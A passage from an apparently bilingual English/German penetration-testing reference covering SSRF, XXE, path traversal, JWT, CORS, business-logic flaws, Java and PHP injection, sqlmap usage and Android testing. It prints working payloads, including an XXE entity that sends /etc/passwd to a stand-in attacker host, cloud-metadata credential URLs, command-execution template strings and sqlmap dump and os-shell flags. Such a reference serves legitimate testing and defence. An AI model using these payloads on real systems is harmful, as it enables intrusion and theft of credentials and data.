  <li><strong>Out-of-band.</strong> Parameter-entity DTD hosted by attacker, fetched by victim parser, exfiltrates target file via second HTTP request.
  <pre><code>&lt;!DOCTYPE foo [
  &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
  &lt;!ENTITY % dtd SYSTEM "http://attacker/evil.dtd"&gt;
  %dtd;
  %send;
]&gt;</code></pre>
  <code>evil.dtd</code> contains <code>&lt;!ENTITY % send SYSTEM "http://attacker/?x=%file;"&gt;</code>.</li>
  <li><strong>Billion-laughs.</strong> Nested entity expansion → memory exhaustion. DoS only; rarely the deliverable.</li>
  <li><strong>Parsers safe by default.</strong> Modern libxml2 with default safe settings, Java's DocumentBuilder with FEATURE_SECURE_PROCESSING. Test anyway — defaults get overridden in real apps.</li>
</ul>

<h2>Path traversal</h2>
<ul>
  <li><strong>Classic.</strong> <code>?file=../../../../etc/passwd</code>. Still works on legacy apps and behind misconfigured reverse-proxies that normalize differently than the backend.</li>
  <li><strong>Encoded.</strong> <code>..%2f</code>, <code>%252e%252e%252f</code> (double-encoded), <code>..%c0%af</code> (overlong UTF-8). One of these usually slips through.</li>
  <li><strong>Path normalization mismatch.</strong> Front-end (nginx) strips <code>..</code> sequences but back-end (uwsgi) does its own resolution. Send <code>..%2f</code> raw — front-end sees no traversal, back-end resolves.</li>
  <li><strong>Null byte truncation.</strong> Legacy PHP / Java where <code>?file=secret.pdf%00.png</code> truncates to <code>secret.pdf</code>. Rare but still exists.</li>
  <li><strong>Defense.</strong> Resolve to canonical path (<code>realpath</code>), verify result is within allowed directory. Never rely on substring filtering.</li>
</ul>
<div class="rs-rule"><strong>Rule of thumb</strong>Always test SSRF with cloud-metadata URLs first if the target runs in a known cloud. Faster proof, more obvious impact, harder to dispute than a blind internal-IP probe.</div>
`,
      `
<h2>SSRF — Vektor-Inventar</h2>
<ul>
  <li><strong>URL-Parameter.</strong> <code>?url=</code>, <code>?next=</code>, <code>?image=</code>, <code>?callback=</code>, <code>?webhook=</code>. Alles wo der Server fetcht.</li>
  <li><strong>Webhook-Callback.</strong> "Wir POSTen auf deine URL bei Event X" — Angreifer setzt URL auf internes Ziel. Umgeht in vielen Setups Outbound-Allow-Listen.</li>
  <li><strong>Image-/Avatar-Fetch.</strong> <code>?avatar=http://...</code> mit server-seitiger Image-Processing-Pipeline. Returns oft opak, also zuerst blind testen.</li>
  <li><strong>PDF- / HTML-to-PDF-Renderer.</strong> <code>&lt;iframe src=//attacker&gt;</code> oder <code>&lt;img src=//attacker&gt;</code> in HTML injizieren, das der Server rendert. Die meisten Renderer fetchen Sub-Resources ohne Sandboxing.</li>
  <li><strong>XML- / SOAP-Body mit URLs.</strong> Viele SOAP-Services folgen URLs in WSDL-/SOAP-Envelopes server-seitig.</li>
  <li><strong>Document-Import.</strong> "Import aus URL"-Features — DOC, XLSX, ZIP — fetchen URL server-seitig, folgen manchmal Redirects ins Interne.</li>
</ul>

<h2>SSRF — Proof- und Exfil-Techniken</h2>
<ul>
  <li><strong>Cloud-Metadata zuerst.</strong> <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code> (AWS), <code>http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json</code> mit <code>Metadata-Flavor: Google</code>, <code>http://169.254.169.254/metadata/instance?api-version=2021-02-01</code> mit <code>Metadata: true</code> (Azure).</li>
  <li><strong>Blind via DNS.</strong> <code>?url=http://&lt;random&gt;.attacker.tld/</code> + auf deinem Authoritative DNS Queries lauschen.</li>
  <li><strong>Blind via HTTP.</strong> interactsh- / Burp-Collaborator-URL nutzen. Detektiert Fetch ohne sichtbare Response.</li>
  <li><strong>Internal Port-Scan.</strong> Zeitunterschied in Response: connection-refused vs accepted vs timed-out gibt Port-Status.</li>
  <li><strong>Redirect-Chaining.</strong> Server validiert URL gegen Allow-List, folgt Redirect: gehostete Angreifer-URL liefert 302 auf <code>http://169.254.169.254</code>. Trivialer Bypass.</li>
  <li><strong>DNS-Rebinding.</strong> Angreifer-DNS liefert valide IP beim ersten Lookup (besteht Allow-List), interne IP beim zweiten (aufgelöst beim Fetch). Schlägt Parse-Time-Validierung.</li>
  <li><strong>Protokoll-Smuggling.</strong> Wenn Parser <code>gopher://</code> oder <code>dict://</code> oder <code>file://</code> akzeptiert — Redis auf localhost via gopher ist die Klassik-Kette.</li>
</ul>

<h2>XXE</h2>
<ul>
  <li><strong>In-Band-Exfil.</strong> <code>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code> — wenn Response den parsed Body echot, kommen File-Inhalte zurück.</li>
  <li><strong>Out-of-Band.</strong> Parameter-Entity-DTD vom Angreifer gehostet, vom Victim-Parser gefetcht, exfiltriert Ziel-File via zweitem HTTP-Request.
  <pre><code>&lt;!DOCTYPE foo [
  &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
  &lt;!ENTITY % dtd SYSTEM "http://attacker/evil.dtd"&gt;
  %dtd;
  %send;
]&gt;</code></pre>
  <code>evil.dtd</code> enthält <code>&lt;!ENTITY % send SYSTEM "http://attacker/?x=%file;"&gt;</code>.</li>
  <li><strong>Billion-Laughs.</strong> Verschachtelte Entity-Expansion → Memory-Erschöpfung. Nur DoS; selten das Deliverable.</li>
  <li><strong>Default-sichere Parser.</strong> Modernes libxml2 mit Default-Safe-Settings, Javas DocumentBuilder mit FEATURE_SECURE_PROCESSING. Trotzdem testen — Defaults werden in echten Apps overridden.</li>
</ul>

<h2>Path-Traversal</h2>
<ul>
  <li><strong>Klassisch.</strong> <code>?file=../../../../etc/passwd</code>. Funktioniert noch auf Legacy-Apps und hinter misconfigured Reverse-Proxies, die anders normalisieren als das Backend.</li>
  <li><strong>Encoded.</strong> <code>..%2f</code>, <code>%252e%252e%252f</code> (double-encoded), <code>..%c0%af</code> (overlong UTF-8). Eines davon rutscht meist durch.</li>
  <li><strong>Path-Normalisierungs-Mismatch.</strong> Front-End (nginx) strippt <code>..</code>-Sequenzen, Backend (uwsgi) macht eigene Auflösung. <code>..%2f</code> raw senden — Front-End sieht kein Traversal, Backend löst auf.</li>
  <li><strong>Null-Byte-Truncation.</strong> Legacy PHP / Java wo <code>?file=secret.pdf%00.png</code> auf <code>secret.pdf</code> trunciert. Selten aber existiert noch.</li>
  <li><strong>Verteidigung.</strong> Auf kanonischen Pfad auflösen (<code>realpath</code>), Ergebnis im erlaubten Verzeichnis verifizieren. Niemals auf Substring-Filtering verlassen.</li>
</ul>
<div class="rs-rule"><strong>Faustregel</strong>SSRF immer zuerst mit Cloud-Metadata-URLs testen wenn das Ziel in bekannter Cloud läuft. Schnellerer Proof, offensichtlicherer Impact, schwerer zu bestreiten als ein blinder Internal-IP-Probe.</div>
`
    ),
    phases: ["ssrf", "xxe"]
  },
  {
    id: "authentication-and-logic",
    domain: "application-identity", tier: 1,
    title: T("Authentication, Logic & Architecture Flaws", "Authentifizierung, Logik & Architektur-Fehler"),
    blurb: T(
      "Password-recovery logic flaws, JWT/CORS/TLS architecture issues, the working top-10 business-logic patterns, and how a real intrusion looks in logs vs. test traffic.",
      "Password-Recovery-Logikfehler, JWT-/CORS-/TLS-Architekturprobleme, die Arbeits-Top-10 der Business-Logic-Muster und wie eine echte Intrusion in Logs vs. Test-Traffic aussieht."
    ),
    body: B(
      `
<h2>Password recovery — recurring flaws</h2>
<ul>
  <li><strong>Predictable tokens.</strong> Reset tokens based on timestamp + user-ID. Test by requesting two resets seconds apart and diffing the tokens.</li>
  <li><strong>Response timing leak.</strong> <code>POST /forgot-password {email:x@y}</code> returns 200 in 80ms for non-existent users, 300ms for existing. Username enumeration via timing.</li>
  <li><strong>Body-shape leak.</strong> "We have sent an email" vs "If the address exists, an email has been sent". The first is leaky.</li>
  <li><strong>Token reuse / non-expiry.</strong> Same token works after first use; valid for days, not minutes.</li>
  <li><strong>Second-factor downgrade.</strong> Password reset bypasses TOTP. After reset, user is logged in with no MFA challenge.</li>
  <li><strong>Reset link includes session token.</strong> Sharing the reset link with a co-worker shares the session.</li>
  <li><strong>Host header injection.</strong> <code>Host: attacker.com</code> in reset request causes the email to contain a link pointing at attacker. Common in apps that use the Host header to construct the reset URL.</li>
</ul>

<h2>JWT — common misuses</h2>
<ul>
  <li><strong>alg: none.</strong> Re-sign token with header <code>{"alg":"none"}</code> and empty signature. Server accepts if it didn't whitelist algorithms.</li>
  <li><strong>HS256 with RSA public key.</strong> Server expects RS256 but accepts HS256. Attacker uses the public RSA key as the HMAC secret → forges any token.</li>
  <li><strong>Key-ID injection.</strong> <code>kid</code> header used in <code>SELECT key FROM keys WHERE id=?</code> without parameterization → SQL injection. Or <code>kid: ../../../etc/passwd</code> for file read.</li>
  <li><strong>Audience claim ignored.</strong> Token issued for service A accepted by service B with the same signing key. Cross-service replay.</li>
  <li><strong>Expiry ignored.</strong> Token from last quarter still accepted.</li>
  <li><strong>Defense.</strong> Hard-code allowed algorithm. Validate <code>iss</code>, <code>aud</code>, <code>exp</code>, <code>nbf</code> explicitly. Reject tokens with unexpected headers.</li>
</ul>

<h2>CORS misconfigs</h2>
<ul>
  <li><strong>Reflect-and-allow-credentials.</strong> Server reads <code>Origin</code>, echoes it as <code>Access-Control-Allow-Origin</code>, sets <code>Allow-Credentials: true</code>. Any attacker site can read authenticated responses.</li>
  <li><strong>Null origin allowed.</strong> Sandbox iframes and data: URLs send <code>Origin: null</code>. Allowing this lets a sandboxed page exfil.</li>
  <li><strong>Subdomain wildcard.</strong> <code>*.example.com</code> trusted; attacker takes over a forgotten subdomain → trusted origin.</li>
  <li><strong>Test.</strong> Send request with <code>Origin: https://attacker.com</code>. If response contains <code>Access-Control-Allow-Origin: https://attacker.com</code> + <code>Allow-Credentials: true</code>, it's exploitable.</li>
</ul>

<h2>API-first pitfalls</h2>
<ul>
  <li><strong>Mass assignment.</strong> <code>PATCH /user/me {role:"admin"}</code> accepted because the JSON deserializer binds all fields by default (Rails strong-params off, Spring no DTO).</li>
  <li><strong>GraphQL introspection in production.</strong> <code>{__schema{types{name,fields{name}}}}</code> returns the full schema. Find hidden mutations.</li>
  <li><strong>GraphQL query-cost DoS.</strong> Nested query: <code>{user{posts{user{posts{user{posts{id}}}}}}}</code>. No depth/cost limit = single request takes down the server.</li>
  <li><strong>Batched mutation auth.</strong> Auth check on single-mutation endpoint, missing on batched-mutation endpoint.</li>
  <li><strong>HTTP method override.</strong> POST with <code>X-HTTP-Method-Override: DELETE</code> bypasses a WAF rule that filtered on DELETE.</li>
</ul>

<h2>Working top-10 business-logic flaws</h2>
<ol>
  <li><strong>Negative quantity.</strong> Cart accepts <code>quantity: -3</code>; total goes negative; refund issued.</li>
  <li><strong>Discount stacking.</strong> Two single-use codes applied via parallel requests.</li>
  <li><strong>Step-skipping.</strong> Direct POST to step 5 of a 5-step wizard without completing steps 1–4.</li>
  <li><strong>Race-condition double-spend.</strong> Two concurrent withdrawal requests, balance decremented once.</li>
  <li><strong>Currency rounding abuse.</strong> Buy 0.0001 BTC repeatedly when rounding favors the user.</li>
  <li><strong>Trial-period reset.</strong> Delete account + recreate with same email = new trial.</li>
  <li><strong>Authorization at the wrong layer.</strong> UI hides the admin button but the API endpoint doesn't check role.</li>
  <li><strong>Cancel after success.</strong> Cancel-order endpoint reverses the inventory deduction but not the discount usage.</li>
  <li><strong>Voucher / referral exploit.</strong> Self-referral via two accounts, both get the bonus.</li>
  <li><strong>State-machine bypass.</strong> Order goes from PENDING straight to FULFILLED without PAID.</li>
</ol>
<div class="rs-rule"><strong>Rule of thumb</strong>Logic flaws don't show up in scanner output. Walk every authenticated role end-to-end at least once, then deliberately try to do each action out of order. That single discipline finds more logic flaws than any tool.</div>
`,
      `
<h2>Password-Recovery — wiederkehrende Fehler</h2>
<ul>
  <li><strong>Vorhersagbare Tokens.</strong> Reset-Tokens basierend auf Timestamp + User-ID. Test: zwei Resets Sekunden auseinander anfordern, Tokens diffen.</li>
  <li><strong>Response-Timing-Leak.</strong> <code>POST /forgot-password {email:x@y}</code> liefert 200 in 80ms für nicht-existierende User, 300ms für existierende. Username-Enumeration via Timing.</li>
  <li><strong>Body-Shape-Leak.</strong> "Wir haben eine E-Mail gesendet" vs "Wenn die Adresse existiert, wurde eine E-Mail gesendet". Erstere leakt.</li>
  <li><strong>Token-Reuse / Non-Expiry.</strong> Gleiches Token funktioniert nach erster Nutzung; gültig Tage statt Minuten.</li>
  <li><strong>Second-Factor-Downgrade.</strong> Password-Reset umgeht TOTP. Nach Reset User eingeloggt ohne MFA-Challenge.</li>
  <li><strong>Reset-Link enthält Session-Token.</strong> Link mit Kollegen teilen teilt die Session.</li>
  <li><strong>Host-Header-Injection.</strong> <code>Host: attacker.com</code> im Reset-Request lässt E-Mail-Link auf Angreifer zeigen. Häufig in Apps, die Host-Header zum Konstruieren der Reset-URL nutzen.</li>
</ul>

<h2>JWT — häufige Misuses</h2>
<ul>
  <li><strong>alg: none.</strong> Token mit Header <code>{"alg":"none"}</code> und leerer Signatur re-signen. Server akzeptiert wenn er Algorithmen nicht whitelisted hat.</li>
  <li><strong>HS256 mit RSA-Public-Key.</strong> Server erwartet RS256, akzeptiert HS256. Angreifer nutzt den RSA-Public-Key als HMAC-Secret → forged beliebige Tokens.</li>
  <li><strong>Key-ID-Injection.</strong> <code>kid</code>-Header in <code>SELECT key FROM keys WHERE id=?</code> ohne Parameterisierung → SQL-Injection. Oder <code>kid: ../../../etc/passwd</code> für File-Read.</li>
  <li><strong>Audience-Claim ignoriert.</strong> Token für Service A ausgestellt, von Service B mit gleichem Signing-Key akzeptiert. Cross-Service-Replay.</li>
  <li><strong>Expiry ignoriert.</strong> Token vom letzten Quartal noch akzeptiert.</li>
  <li><strong>Verteidigung.</strong> Erlaubten Algorithmus hardcoden. <code>iss</code>, <code>aud</code>, <code>exp</code>, <code>nbf</code> explizit validieren. Tokens mit unerwarteten Headern abweisen.</li>
</ul>

<h2>CORS-Misconfigs</h2>
<ul>
  <li><strong>Reflect-and-Allow-Credentials.</strong> Server liest <code>Origin</code>, echot ihn als <code>Access-Control-Allow-Origin</code>, setzt <code>Allow-Credentials: true</code>. Jede Angreifer-Site kann authentifizierte Responses lesen.</li>
  <li><strong>Null-Origin erlaubt.</strong> Sandbox-iframes und data:-URLs senden <code>Origin: null</code>. Erlauben heißt: sandboxed Page kann exfiltrieren.</li>
  <li><strong>Subdomain-Wildcard.</strong> <code>*.example.com</code> trusted; Angreifer übernimmt vergessene Subdomain → trusted Origin.</li>
  <li><strong>Test.</strong> Request mit <code>Origin: https://attacker.com</code> senden. Wenn Response <code>Access-Control-Allow-Origin: https://attacker.com</code> + <code>Allow-Credentials: true</code> enthält, ausnutzbar.</li>
</ul>

<h2>API-first-Fallstricke</h2>
<ul>
  <li><strong>Mass-Assignment.</strong> <code>PATCH /user/me {role:"admin"}</code> akzeptiert, weil JSON-Deserializer per default alle Felder bindet (Rails Strong-Params aus, Spring kein DTO).</li>
  <li><strong>GraphQL-Introspection in Produktion.</strong> <code>{__schema{types{name,fields{name}}}}</code> liefert volles Schema. Versteckte Mutations finden.</li>
  <li><strong>GraphQL-Query-Cost-DoS.</strong> Nested Query: <code>{user{posts{user{posts{user{posts{id}}}}}}}</code>. Kein Depth-/Cost-Limit = einzelner Request legt Server lahm.</li>
  <li><strong>Batched-Mutation-Auth.</strong> Auth-Check auf Single-Mutation-Endpoint, fehlt auf Batched-Mutation-Endpoint.</li>
  <li><strong>HTTP-Method-Override.</strong> POST mit <code>X-HTTP-Method-Override: DELETE</code> umgeht WAF-Regel, die auf DELETE filterte.</li>
</ul>

<h2>Arbeits-Top-10 der Business-Logic-Fehler</h2>
<ol>
  <li><strong>Negative Menge.</strong> Warenkorb akzeptiert <code>quantity: -3</code>; Total wird negativ; Refund ausgestellt.</li>
  <li><strong>Rabatt-Stacking.</strong> Zwei Single-Use-Codes via parallele Requests angewendet.</li>
  <li><strong>Step-Skipping.</strong> Direkter POST auf Schritt 5 eines 5-Schritt-Wizards ohne Schritte 1–4.</li>
  <li><strong>Race-Condition-Double-Spend.</strong> Zwei gleichzeitige Withdrawal-Requests, Balance nur einmal dekrementiert.</li>
  <li><strong>Currency-Rounding-Missbrauch.</strong> 0.0001 BTC wiederholt kaufen wenn Rundung dem User zugutekommt.</li>
  <li><strong>Trial-Period-Reset.</strong> Account löschen + mit gleicher E-Mail neu erstellen = neuer Trial.</li>
  <li><strong>Autorisierung auf falscher Schicht.</strong> UI versteckt Admin-Button, API-Endpoint prüft Rolle nicht.</li>
  <li><strong>Cancel nach Success.</strong> Cancel-Order-Endpoint reverst Inventory-Dekrement, aber nicht den Discount-Verbrauch.</li>
  <li><strong>Voucher-/Referral-Exploit.</strong> Self-Referral via zwei Accounts, beide bekommen Bonus.</li>
  <li><strong>State-Machine-Bypass.</strong> Order geht von PENDING direkt zu FULFILLED ohne PAID.</li>
</ol>
<div class="rs-rule"><strong>Faustregel</strong>Logik-Fehler zeigen sich nicht im Scanner-Output. Jede authentifizierte Rolle End-to-End mindestens einmal durchlaufen, dann gezielt versuchen, Aktionen in falscher Reihenfolge auszuführen. Diese Disziplin findet mehr Logik-Fehler als jedes Tool.</div>
`
    ),
    phases: ["biz-logic", "session", "cors-tls-jwt", "api", "auth"]
  },
  {
    id: "server-side-language-audits",
    domain: "application-identity", tier: 2,
    title: T("Server-Side Language Audits — Java, PHP, SQLmap", "Server-Side-Sprachen — Java, PHP, SQLmap"),
    blurb: T(
      "Stack-specific notes for Java and PHP — deserialization gadgets, expression-language injection, tainted-input flow — paired with SQLmap operator flags and the OWASP testing checklist.",
      "Stack-spezifische Notizen zu Java und PHP — Deserialisierungs-Gadgets, EL-Injection, Tainted-Input-Flow — mit SQLmap-Operator-Flags und der OWASP-Testing-Checkliste."
    ),
    body: B(
      `
<h2>Java — deserialization gadgets</h2>
<ul>
  <li><strong>ysoserial gadget chains.</strong> CommonsCollections1/5/6, CommonsBeanutils1, Spring1/2, Click1, MozillaRhino1/2. Each chain depends on specific dependency versions on the classpath.</li>
  <li><strong>Where they fire.</strong> RMI/JMX (port 1099/9999), JNDI lookup, anything calling <code>ObjectInputStream.readObject()</code> on attacker bytes — RMI, JMS, EJB invocation, hidden inside HTTP cookie / session / form parameter.</li>
  <li><strong>JEP-290 landscape.</strong> Post-JDK-9 added serial filtering. Most apps don't configure filters — still wide open. <code>jdk.serialFilter</code> sysprop or per-stream <code>ObjectInputFilter</code>.</li>
  <li><strong>Discovery process.</strong> Identify Java version, list dependencies (<code>jar tf</code> on lib/), match against known gadget catalog, send DNS-callback payload first.</li>
  <li><strong>Defense.</strong> Migrate from Java-native serialization to JSON. If you can't, use safelist filter and never deserialize bytes from network without auth.</li>
</ul>

<h2>Java — expression-language injection</h2>
<ul>
  <li><strong>Spring (SpEL).</strong> <code>\${T(java.lang.Runtime).getRuntime().exec('id')}</code> in any template/header processed by Spring EL.</li>
  <li><strong>Struts2 OGNL.</strong> <code>%{(#_='multipart/form-data').(...)}</code> — historical Equifax-class chain. Still appears in legacy Struts.</li>
  <li><strong>Thymeleaf.</strong> SSTI when user input flows into template name: <code>~{__\${T(Runtime).getRuntime().exec('id')}__::x}</code>.</li>
  <li><strong>Test.</strong> Inject <code>\${7*7}</code> first. <code>49</code> in output = SSTI confirmed; proceed with class lookup.</li>
</ul>

<h2>PHP — taint flow review checklist</h2>
<ul>
  <li><strong>Sources.</strong> <code>$_GET</code>, <code>$_POST</code>, <code>$_COOKIE</code>, <code>$_FILES</code>, <code>$_SERVER['HTTP_*']</code>, <code>file_get_contents('php://input')</code>.</li>
  <li><strong>Sinks: code execution.</strong> <code>eval</code>, <code>assert</code>, <code>preg_replace</code> with <code>/e</code> flag (legacy), <code>create_function</code>, <code>include</code>/<code>require</code>(<code>_once</code>) with variable.</li>
  <li><strong>Sinks: command execution.</strong> <code>exec</code>, <code>system</code>, <code>passthru</code>, <code>shell_exec</code>, backticks, <code>popen</code>, <code>proc_open</code>.</li>
  <li><strong>Sinks: file.</strong> <code>file_put_contents</code>, <code>fopen</code>, <code>copy</code>, <code>move_uploaded_file</code>, <code>unlink</code>.</li>
  <li><strong>Sinks: SQL.</strong> Any <code>mysqli_query</code> / <code>PDO->query</code> with concatenation. <code>PDO->prepare</code> + bind is safe.</li>
  <li><strong>Sink: unserialize.</strong> <code>unserialize($_COOKIE['x'])</code> + any class with <code>__destruct</code>/<code>__wakeup</code>/<code>__toString</code> = gadget chain. PHPGGC for known chains.</li>
</ul>

<h2>sqlmap — production-safe flags</h2>
<ul>
  <li><strong>Detection only first.</strong> <code>sqlmap -u "URL" --batch --random-agent --level=3 --risk=1</code>. Don't escalate risk until detection is confirmed.</li>
  <li><strong>WAF-bypass tamper scripts.</strong> <code>--tamper=between,randomcase,space2comment</code> for generic; <code>--tamper=charunicodeencode</code> for nginx-fronted; combine 2–3 max — more breaks detection.</li>
  <li><strong>Time-based tuning.</strong> <code>--time-sec=10</code> to reduce false positives on jittery network. <code>--technique=BT</code> if union-based is unreliable.</li>
  <li><strong>Authenticated.</strong> <code>--cookie="session=..."</code> or <code>--load-cookies=cookies.txt</code>. <code>--csrf-token=token</code> with <code>--csrf-url</code> for token-protected forms.</li>
  <li><strong>Extraction.</strong> <code>--current-user --current-db --hostname</code> first (small, low-risk). Only then <code>--dbs --tables --columns -D foo -T users --dump</code>.</li>
  <li><strong>Post-exploit.</strong> <code>--os-shell</code> requires DB user to be DBA + writable webroot. <code>--file-read=/etc/passwd</code> for proof without command execution.</li>
  <li><strong>Don't.</strong> <code>--risk=3</code> on production without explicit auth; some payloads update/delete data.</li>
</ul>

<h2>OWASP testing checklist — minimum pre-flight</h2>
<ol>
  <li>Authentication: 0/2FA bypass, weak password policy, default creds.</li>
  <li>Session: token entropy, fixation, timeout, logout invalidation.</li>
  <li>Authorization: vertical (admin functions), horizontal (peer IDOR), missing function-level.</li>
  <li>Input: every class from the OWASP catalog tested against every parameter.</li>
  <li>Crypto: TLS posture (sslyze), hashing (bcrypt vs MD5), storage of secrets.</li>
  <li>Error handling: stack traces, debug pages, verbose 500s.</li>
  <li>Logging: are events captured, can attacker disable, can defender reconstruct.</li>
  <li>Business logic: end-to-end walkthrough per role.</li>
</ol>
<div class="rs-rule"><strong>Rule of thumb</strong>For Java apps, dump the lib/ directory and match against ysoserial gadget catalog before sending any payload. Sending random gadgets blind generates EDR noise and wastes detection budget.</div>
`,
      `
<h2>Java — Deserialisierungs-Gadgets</h2>
<ul>
  <li><strong>ysoserial-Gadget-Chains.</strong> CommonsCollections1/5/6, CommonsBeanutils1, Spring1/2, Click1, MozillaRhino1/2. Jede Chain hängt von spezifischen Dependency-Versionen im Classpath ab.</li>
  <li><strong>Wo sie feuern.</strong> RMI/JMX (Port 1099/9999), JNDI-Lookup, alles was <code>ObjectInputStream.readObject()</code> auf Angreifer-Bytes aufruft — RMI, JMS, EJB-Invocation, versteckt in HTTP-Cookie / Session / Form-Parameter.</li>
  <li><strong>JEP-290-Landschaft.</strong> Post-JDK-9 brachte Serial-Filtering. Die meisten Apps konfigurieren keine Filter — noch sperrangelweit. <code>jdk.serialFilter</code> Sysprop oder per-Stream <code>ObjectInputFilter</code>.</li>
  <li><strong>Discovery-Prozess.</strong> Java-Version identifizieren, Dependencies listen (<code>jar tf</code> auf lib/), gegen bekannten Gadget-Katalog matchen, zuerst DNS-Callback-Payload senden.</li>
  <li><strong>Verteidigung.</strong> Weg von Java-native-Serialization, hin zu JSON. Wenn nicht möglich, Safelist-Filter und Netz-Bytes ohne Auth nie deserialisieren.</li>
</ul>

<h2>Java — Expression-Language-Injection</h2>
<ul>
  <li><strong>Spring (SpEL).</strong> <code>\${T(java.lang.Runtime).getRuntime().exec('id')}</code> in jedem Template/Header, den Spring EL prozessiert.</li>
  <li><strong>Struts2 OGNL.</strong> <code>%{(#_='multipart/form-data').(...)}</code> — historische Equifax-Klassen-Chain. Erscheint noch in Legacy-Struts.</li>
  <li><strong>Thymeleaf.</strong> SSTI wenn User-Input in Template-Name fließt: <code>~{__\${T(Runtime).getRuntime().exec('id')}__::x}</code>.</li>
  <li><strong>Test.</strong> Zuerst <code>\${7*7}</code> injizieren. <code>49</code> im Output = SSTI bestätigt; mit Class-Lookup fortfahren.</li>
</ul>

<h2>PHP — Taint-Flow-Review-Checkliste</h2>
<ul>
  <li><strong>Sources.</strong> <code>$_GET</code>, <code>$_POST</code>, <code>$_COOKIE</code>, <code>$_FILES</code>, <code>$_SERVER['HTTP_*']</code>, <code>file_get_contents('php://input')</code>.</li>
  <li><strong>Sinks: Code-Execution.</strong> <code>eval</code>, <code>assert</code>, <code>preg_replace</code> mit <code>/e</code>-Flag (Legacy), <code>create_function</code>, <code>include</code>/<code>require</code>(<code>_once</code>) mit Variable.</li>
  <li><strong>Sinks: Command-Execution.</strong> <code>exec</code>, <code>system</code>, <code>passthru</code>, <code>shell_exec</code>, Backticks, <code>popen</code>, <code>proc_open</code>.</li>
  <li><strong>Sinks: File.</strong> <code>file_put_contents</code>, <code>fopen</code>, <code>copy</code>, <code>move_uploaded_file</code>, <code>unlink</code>.</li>
  <li><strong>Sinks: SQL.</strong> Jedes <code>mysqli_query</code> / <code>PDO->query</code> mit Konkatenation. <code>PDO->prepare</code> + Bind ist sicher.</li>
  <li><strong>Sink: unserialize.</strong> <code>unserialize($_COOKIE['x'])</code> + jede Klasse mit <code>__destruct</code>/<code>__wakeup</code>/<code>__toString</code> = Gadget-Chain. PHPGGC für bekannte Chains.</li>
</ul>

<h2>sqlmap — produktionssichere Flags</h2>
<ul>
  <li><strong>Erst nur Detektion.</strong> <code>sqlmap -u "URL" --batch --random-agent --level=3 --risk=1</code>. Risk nicht eskalieren bis Detektion bestätigt ist.</li>
  <li><strong>WAF-Bypass-Tamper-Scripts.</strong> <code>--tamper=between,randomcase,space2comment</code> generisch; <code>--tamper=charunicodeencode</code> für nginx-fronted; 2–3 max kombinieren — mehr bricht Detektion.</li>
  <li><strong>Time-Based-Tuning.</strong> <code>--time-sec=10</code> reduziert False-Positives auf jittery Netz. <code>--technique=BT</code> wenn Union-Based unzuverlässig.</li>
  <li><strong>Authentifiziert.</strong> <code>--cookie="session=..."</code> oder <code>--load-cookies=cookies.txt</code>. <code>--csrf-token=token</code> mit <code>--csrf-url</code> für Token-geschützte Forms.</li>
  <li><strong>Extraktion.</strong> <code>--current-user --current-db --hostname</code> zuerst (klein, low-risk). Erst dann <code>--dbs --tables --columns -D foo -T users --dump</code>.</li>
  <li><strong>Post-Exploit.</strong> <code>--os-shell</code> erfordert DB-User als DBA + beschreibbares Webroot. <code>--file-read=/etc/passwd</code> für Proof ohne Command-Execution.</li>
  <li><strong>Nicht.</strong> <code>--risk=3</code> in Produktion ohne explizite Erlaubnis; einige Payloads updaten/löschen Daten.</li>
</ul>

<h2>OWASP-Testing-Checkliste — Minimum-Pre-Flight</h2>
<ol>
  <li>Authentifizierung: 0/2FA-Bypass, schwache Password-Policy, Default-Creds.</li>
  <li>Session: Token-Entropie, Fixation, Timeout, Logout-Invalidation.</li>
  <li>Autorisierung: vertikal (Admin-Funktionen), horizontal (Peer-IDOR), fehlende Function-Level.</li>
  <li>Input: jede Klasse aus OWASP-Katalog gegen jeden Parameter getestet.</li>
  <li>Crypto: TLS-Posture (sslyze), Hashing (bcrypt vs MD5), Storage von Secrets.</li>
  <li>Error-Handling: Stack-Traces, Debug-Pages, verbose 500er.</li>
  <li>Logging: werden Events erfasst, kann Angreifer disablen, kann Verteidiger rekonstruieren.</li>
  <li>Business-Logik: End-to-End-Walkthrough pro Rolle.</li>
</ol>
<div class="rs-rule"><strong>Faustregel</strong>Für Java-Apps lib/-Verzeichnis dumpen und gegen ysoserial-Gadget-Katalog matchen bevor irgendein Payload gesendet wird. Random-Gadgets blind senden generiert EDR-Noise und verbrennt Detektionsbudget.</div>
`
    ),
    phases: ["sqli", "deserialization", "upload", "xxe", "cmd-injection", "xss", "csrf", "idor", "methodology"]
  },
  {
    id: "mobile-platform-security",
    domain: "application-identity", tier: 3,
    title: T("Mobile Platform Security — Android, iOS, macOS", "Mobile-Plattform-Sicherheit — Android, iOS, macOS"),
    blurb: T(
      "Per-platform attack surface and skills reference: Android permission model and APK static/dynamic attacks, iOS entitlement reasoning, macOS TCC and codesign.",
      "Angriffsfläche und Skill-Referenz pro Plattform: Android-Permission-Modell und APK-Static-/Dynamic-Attacks, iOS-Entitlement-Reasoning, macOS-TCC und codesign."
    ),
    body: B(
      `
<h2>Android — attack surface review</h2>
<ul>
  <li><strong>APK unpacking.</strong> <code>apktool d app.apk</code> for resources + smali; <code>jadx-gui app.apk</code> for decompiled Java. Read <code>AndroidManifest.xml</code> first — exported activities, services, providers, receivers are entry points.</li>
  <li><strong>Permission model.</strong> Dangerous permissions (CAMERA, LOCATION, READ_SMS) need runtime grant on API 23+. Look for <code>checkSelfPermission</code> + early-return logic; missing checks = bypass.</li>
  <li><strong>Exported components.</strong> <code>android:exported="true"</code> without intent-filter permission = callable from any installed app. <code>drozer console connect</code>, <code>run app.activity.start --component pkg cls</code>.</li>
  <li><strong>Insecure deep links.</strong> Custom scheme + WebView <code>loadUrl</code> on intent extras = local file read or arbitrary URL load. Check for <code>file://</code> handling.</li>
  <li><strong>Network security config.</strong> <code>res/xml/network_security_config.xml</code> — <code>cleartextTrafficPermitted</code>, custom trust anchors, certificate pinning. Defender's first hardening.</li>
  <li><strong>SSL pinning bypass.</strong> Frida script <code>frida -U -l ssl-pinning-bypass.js -f pkg</code> or <code>objection -g pkg explore</code> → <code>android sslpinning disable</code>.</li>
  <li><strong>Root detection bypass.</strong> Same Frida toolchain — hook <code>RootBeer</code>, <code>SafetyNet</code>, or per-app heuristics.</li>
